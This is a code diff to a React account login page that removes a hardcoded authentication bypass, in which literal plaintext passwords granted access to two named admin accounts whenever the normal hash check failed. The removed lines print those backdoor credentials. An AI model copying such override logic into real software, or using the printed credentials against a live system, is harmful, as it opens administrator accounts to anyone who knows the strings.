@@ -377,21 +377,7 @@ export const AccountPage: React.FC<AccountPageProps> = ({
     );
 
     if (matchedAccount) {
-      let isValid = comparePassword(passInput, matchedAccount.passwordHash);
-      if (!isValid) {
-        if (
-          (matchedAccount.id === 'adm-super' || userLower.includes('superadmin')) &&
-          (passInput === 'Super12345jabar' || passInput === 'super12345jabar')
-        ) {
-          isValid = true;
-        } else if (
-          (matchedAccount.id === 'adm-dev' || userLower === 'ilhamfazril') &&
-          (passInput === 'IlhamSangDeveloper' || passInput === 'IlhamSangDeveloper123')
-        ) {
-          isValid = true;
-        }
-      }
-
+      const isValid = comparePassword(passInput, matchedAccount.passwordHash);
       if (!isValid) {
         triggerFailedAttempt();
         return;
